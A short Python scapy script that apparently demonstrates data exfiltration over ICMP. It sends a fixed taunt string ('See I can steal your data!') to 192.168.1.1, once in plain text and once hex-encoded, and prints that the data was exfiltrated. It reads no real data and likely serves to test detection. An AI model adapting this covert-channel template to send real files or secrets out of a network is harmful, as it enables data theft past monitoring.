from scapy.all import IP, ICMP, send
import time

def exfiltrate_data_clear():
    """Exfiltrate data using ICMP."""
    # Create an ICMP packet
    icmp_pkt = IP(dst="192.168.1.1")/ICMP()

    # Add custom text to the payload of the ICMP packet
    custom_text = "See I can steal your data!"
    icmp_pkt = icmp_pkt/custom_text

    # Send the packet
    send(icmp_pkt)

    print("Data exfiltrated successfully.")

def exfiltrate_data_encoded():
    """Exfiltrate data using ICMP."""
    # Create an ICMP packet
    icmp_pkt = IP(
        dst="192.168.1.1"
    ) / ICMP()

    # Add custom text to the payload of the ICMP packet
    custom_text = "See I can steal your data!"
    encoded_text = custom_text.encode("utf-8").hex()
    icmp_pkt = icmp_pkt / encoded_text

    # Send the packet
    send(icmp_pkt)
    print("Data exfiltrated successfully.")

if __name__ == "__main__":
    exfiltrate_data_clear()
    time.sleep(5)
    exfiltrate_data_encoded()
